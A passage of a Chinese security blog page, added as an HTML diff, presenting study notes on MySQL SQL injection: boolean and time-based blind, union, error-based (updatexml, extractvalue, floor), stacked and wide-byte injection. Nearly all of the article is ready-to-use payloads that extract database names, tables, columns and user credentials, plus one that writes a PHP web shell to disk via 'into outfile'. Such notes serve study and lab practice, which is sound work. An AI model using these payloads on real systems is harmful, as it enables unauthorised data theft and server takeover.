@@ -1,0 +1,714 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言SQLI(SQL Injection)， SQL注入是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句，导致了SQL注入的产生。攻击者可通过SQL注入直接获取数据库信息，造成信息泄漏。  bool盲注一、盲注常用函数    函数 作用    length() 返回字符串的长度，例如可以返回数据库名字的长度   substr() 截取字符串,偏移从1开始，非从0开始">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入学习笔记-MYSQL注入">
+<meta property="og:url" content="http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="世间闲客·此闲行">
+<meta property="og:description" content="前言SQLI(SQL Injection)， SQL注入是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句，导致了SQL注入的产生。攻击者可通过SQL注入直接获取数据库信息，造成信息泄漏。  bool盲注一、盲注常用函数    函数 作用    length() 返回字符串的长度，例如可以返回数据库名字的长度   substr() 截取字符串,偏移从1开始，非从0开始">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-09-11T11:48:41.000Z">
+<meta property="article:modified_time" content="2023-04-04T15:39:50.000Z">
+<meta property="article:author" content="Funsiooo">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="MYSQL">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/logo-1.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/logo-1.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo-1.png">
+        
+      
+    
+    <!-- title -->
+    <title>SQL注入学习笔记-MYSQL注入</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@4.0/dist/fancybox.css" />
+
+<meta name="generator" content="Hexo 5.4.2"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
+
+<body class="max-width mx-auto px3 ">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/2022/09/17/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1(%E4%B8%80)-SQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/2022/09/03/%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5%E8%A1%A8--%E9%95%BF%E6%9C%9F%E6%9B%B4%E6%96%B0/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&text=SQL注入学习笔记-MYSQL注入"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&is_video=false&description=SQL注入学习笔记-MYSQL注入"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=SQL注入学习笔记-MYSQL注入&body=Check out this article: http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&title=SQL注入学习笔记-MYSQL注入"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&name=SQL注入学习笔记-MYSQL注入&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2022/09/11/SQL%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B8%80-MYSQL%E6%B3%A8%E5%85%A5/&t=SQL注入学习笔记-MYSQL注入"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">bool盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">联合注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">5.</span> <span class="toc-text">时间盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5"><span class="toc-number">6.</span> <span class="toc-text">堆叠注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">7.</span> <span class="toc-text">宽字节注入</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        SQL注入学习笔记-MYSQL注入
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Funsiooo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-09-11T11:48:41.000Z" itemprop="datePublished">2022-09-11</time>
+        
+        (Updated: <time datetime="2023-04-04T15:39:50.000Z" itemprop="dateModified">2023-04-04</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/MYSQL/" rel="tag">MYSQL</a>, <a class="tag-link-link" href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag">SQL注入</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>SQLI(SQL Injection)， SQL注入是因为程序未能正确对用户的输入进行检查，将用户的输入以拼接的方式带入SQL语句，导致了SQL注入的产生。攻击者可通过SQL注入直接获取数据库信息，造成信息泄漏。 </p>
+<h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p><code>一、盲注常用函数</code></p>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>length()</td>
+<td>返回字符串的长度，例如可以返回数据库名字的长度</td>
+</tr>
+<tr>
+<td>substr()</td>
+<td>截取字符串,偏移从1开始，非从0开始</td>
+</tr>
+<tr>
+<td>ascii()</td>
+<td>返回字符的ascii码</td>
+</tr>
+<tr>
+<td>sleep(n)</td>
+<td>将程序挂起⼀段时间，n为n秒</td>
+</tr>
+<tr>
+<td>if(expr1,expr2,expr3)</td>
+<td>判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句</td>
+</tr>
+<tr>
+<td>mid()</td>
+<td>mid(a,b,c)从位置b开始，截取a字符串的c位</td>
+</tr>
+<tr>
+<td><br/></td>
+<td></td>
+</tr>
+</tbody></table>
+<p><code>二、判断注入点</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 判断是否存在注入点
+?id=1' and 1=1 --+(正常页面)
+?id=1' and 1=2 --+(报错页面，页面无任何回显)
+
+<p>➤ 有时候系统会将 1&#x3D;1 过滤掉sql语句，此时可尝试其他数值<br>?id&#x3D;1’ and 1352&#x3D;1352 (正常页面)<br>?id&#x3D;1’ and 1352&#x3D;1452 (报错页面，页面无任何回显)</p>
+<p>1’ AND 4003&#x3D;4003 AND ‘Vvmu’&#x3D;’Vvmu’<br>1’ AND 4302&#x3D;4302 AND ‘kBOZ’ like ‘kBOZ’</p>
+<p>➤ 字符型盲注还需要闭合单引号<br>1’ and ‘1’&#x3D;’1	<br>1’ or’1’&#x3D;’2<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+
+<p><code>三、猜解数据库</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 猜解数据库名长度
+1' and length(database())=1 --+		# 猜解数据库名长度为1，返回错误页面
+1' and length(database())=8 --+ 	# 猜解数据库名长度为8，返回正常页面，即数据库名长度为8
+
+<p>➤ 猜解数据库名第一个字符<br>1’ and ascii(substr(database(),1,1))&gt;114 –+	# 正确页面，说明数据库名的第⼀个字符的ascii值⼤于 114（大写字母R的ascii值）；<br>1’ and ascii(substr(database(),1,1))&gt;115 –+	# 错误页面，说明数据库名的第⼀个字符的ascii值不大于115（大写字母S的ascii值）；<br>1’ and ascii(substr(database(),1,1))&#x3D;115 –+	# 显示正确，证明该数据库第一个字符为”S”</p>
+<p>➤ 猜解数据库名第2个字符<br>1’ and ascii(substr(database(),2,1))&gt;100 –+	# 正确页面，说明第二个字符ascill值大于100<br>1’ and ascii(substr(database(),2,1))&gt;101 –+	# 错误页面，说明第二个ascill值少于101<br>1’ and ascii(substr(database(),2,1))&#x3D;101 –+	# 正确页面，第二个字符ascill值为101，对应字符为”e”</p>
+<p>以此类推……直到将8个字符全部猜解成功<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+
+<p><code>四、猜解数据表</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 猜解数据库存在多少个数据表
+1' and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+	# 错误页面，说明不是只有一个数据表
+1' and (select count(table_name) from information_schema.tables where table_schema=database())=4 --+ 	# 正确页面，说明该数据库存在4个数据表
+
+<p>➤ 猜解第一个表长度<br>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;7 –+	# 错误页面，说明第一个表长度不是7<br>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),1))&#x3D;10 –+	# 正确页面，说明第一个表长度为10</p>
+<p>➤ 若想猜解该数据库的第二个表长度，只需更改为 limit 1，1即可，若猜解第三个表更改为 limit 2,1<br>1’ and length(substr((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),1))&#x3D;8 –+</p>
+<p>以此类推……<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+
+<p><code>五、猜解表中字段名</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 猜解一个表中字段数
+1' and (select count(column_name) from information_schema.columns where table_name='数据表名')=1 --+	# 页面错误，说明字段数不为1
+1' and (select count(column_name) from information_schema.columns where table_name='数据表名')=2 --+	# 页面正确，说明字段数为2
+
+<p>若想猜解该表中的第一个字段名长度，只需添加 limit 1,1即可，若猜解第三个字段名长度添加 limit 2,1<br>?id&#x3D;1’ and length(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1))&#x3D;5 –+</p>
+<p>➤ 猜解第一个字段名，第一个字符<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1,1))&#x3D;107 –+	# 页面错误，说明第一个字段名第一个字符ascill值不为107<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1,1))&#x3D;105 –+	# 页面正确，说明第一个字段名第一个字符ascill值为105</p>
+<p>➤ 猜解第一个字段名，第二个字符<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘数据表名’ limit 1,1),1,1))&#x3D;100 –+	# 页面错误，说明第一个字段名，第二个字符ascill值不为100<br>1’ and ascii(substr((select column_name from information_schema.columns where table_name&#x3D; ‘emails’ limit 1,1),1,1))&#x3D;101 –+	   # 页面正确，说明第一个字段名，第二个字符ascill值为101<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+<p><code>六、猜解数据</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 猜解数据
+1' and ascii(substr((select 字段名 from 数据库表名 limit 0,1),1,1))=30 --+		# 页面错误，第一个数据字符ascill值不为30
+1' and ascii(substr((select 字段名 from 数据表名 limit 0,1),1,1))=49 --+	 	 # 页面正确，第一个数据字符ascill值为49
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+<p><code>七、利用字典进行暴力破解</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 直接猜解数据是否为"admin"
+1' and (select count(*) from 数据表名 where 字段名 = 'admin') = 1 --+
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p><code>第一步：判断注入类型</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 整形判断，以下语句，若页面有所变化则可能存在整形注入
+?id=1 and 1=1
+?id=1 and 1=2
+
+<p>➤ 字符型判断，以下语句，若页面有所变化则可能存在字符型注入<br>?id&#x3D;1’ and 1&#x3D;1<br>?id&#x3D;1’ and 1&#x3D;2<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<p><code>第二步、判断字段数，通过 order by 语句，如果后面输入的数字大于数据库的字段数，页面就会报错，正常若少于字段数则表现为正常页面</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 整形
+?id=1 order by 5（页面报错）
+?id=1 order by 4（页面正常，字段数为4）
+
+<p>➤ 字符型<br>?id&#x3D;1’ order by 5（页面报错）<br>?id&#x3D;1’ order by 4（页面正常，字段数为4）<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<p><code>第三步：判断回显点，通过上一步知道字段数为4，所以在联合查询时必须要对应4个查询点，使用联合查询（union）获取回显点，然后构造语句获取数据库名</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ union select 1,2,3,4 --+
+
+<p>➤ union select 1,database(),user(),4 –+<br>如上，当输入第一条语句时，网页出现2,3回显，则在2,3出可构造语句进行联合查询<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<p><code>第四步：通过在回显点处构造注入代码(在报错页面上进行查询，即?id=1&#39; 、 and 1=2等页面)</code></p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 查询数据库
+?id=97 and 1=2 union select 1,2,3,4,database（）,6,7,8,9,10
+
+<p>➤ 查找库中的表<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(‘&lt;br&#x2F;&gt;’,table_name),6,7,8,9,10 from information_schema.tables where table_schema&#x3D;database()</p>
+<p>➤ 查询表中的字段<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(‘&lt;br&#x2F;&gt;’,column_name),6,7,8,9,10 from information_schema.columns where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’</p>
+<p>➤ 查询字段里面的数据<br>?id&#x3D;97 and 1&#x3D;2 union select 1,2,3,4,group_concat(‘&lt;br&#x2F;&gt;’,字段名),6,7,8,9,10 from table_name&#x3D;’表名’</p>
+<p>union select 1,group_concat(字段名),group_concat(字段名) from users（表名）–+</p>
+<p>union+select+1,2,3,4,concat_ws(%27~%27,sclname,sclpx),6,7,8,9,10,11,12+from+shuichuli–+</p>
+<p>-1’ union select 1,(select group_concat(id,0x7c,username,0x7c,password) from users),3–+</p>
+<p>➤ 写入文件<br>?id&#x3D;-1’ union select 1,2,’<?php assert($_POST[less1]);?>‘ into outfile ‘C:&#x2F;less1.php’– s<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p><code>一、当无效输入传递给数据库时，通过触发数据库中的错误来利用基于错误的注入。在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数updatexml(),extractvalue() 当这两个函数在执行时，如果出现xml文档路径错误就会产生报错</code></p>
+<p>1）updatexml()报错注入</p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 爆破数据库版本
+?id=1'+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23
+
+<p>➤ 爆出数据库及相关信息<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#</p>
+<p>➤ 爆当前数据库表信息<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),0x7e),1) #</p>
+<p>➤ 爆数据表字段信息<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’),0x7e),1) #</p>
+<p>➤ 爆数据库内容<br>?id&#x3D;1’ and updatexml(1,concat(0x7e,(select group_concat(first_name,0x7e,last_name) from dvwa.users需自行修改)),1) #<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<p>2）extractvalue（）报错注入</p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 爆破当前数据库信息
+1' and extractvalue(1,concat(0x5c,(select database())))#
+
+<p>➤ 爆破当前数据库表名<br>1’ and extractvalue(1,concat(0x5c,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;’数据库名’)))#</p>
+<p>➤ 爆破当前数据库列名<br>1’ and extractvalue(1,concat(0x5c,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’数据表名’)))#</p>
+<p>➤ 爆破当前数据库数据<br>1’ and extractvalue(1,concat(0x5c,( select group_concat(列名,0x3a,列名) from 数据表名)))#<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<p>3）floor() 报错注入</p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+➤ 爆破数据库版本信息
+?id=1'+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23
+
+<p>➤ 爆破当前用户<br>?id&#x3D;1’+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,user(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>➤ 爆破当前使用的数据库<br>?id&#x3D;1’+and(select 1 from(select count(*),concat((select (select (select concat(0x7e,database(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>➤ 爆破指定表的字段<br>?id&#x3D;1’ +and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,column_name,0x7e) FROM information_schema.columns where table_name&#x3D;0x656d61696c73 LIMIT 0,1)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23<br></pre></p>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>1）主要使用sleep()函数进行判断</p>
+<figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+if(ascii(substr(user(),1,1))=114,sleep(5),2)
+id=1' and length(database())>=4--+
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<h2 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h2><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+在SQL中，分号（;）是用来表示一条sql语句的结束。在 ; 结束一个sql语句后继续构造下一条语句也就造就了堆叠注入
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><figure class="highlight text"><span class="btn-copy tooltipped tooltipped-sw" aria-label="copy to clipboard!"><i class="far fa-clone" aria-hidden="true"></i></span>
+<table>
+<tbody>
+<tr>
+<td class="code">
+<pre>
+id=1%df'
+id=1%df' %23
+id=1%df' union select 1,2,3,database(),5,6,7,8%23
+</pre>
+</td>
+</tr>
+</tbody>
+</table>
+</figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
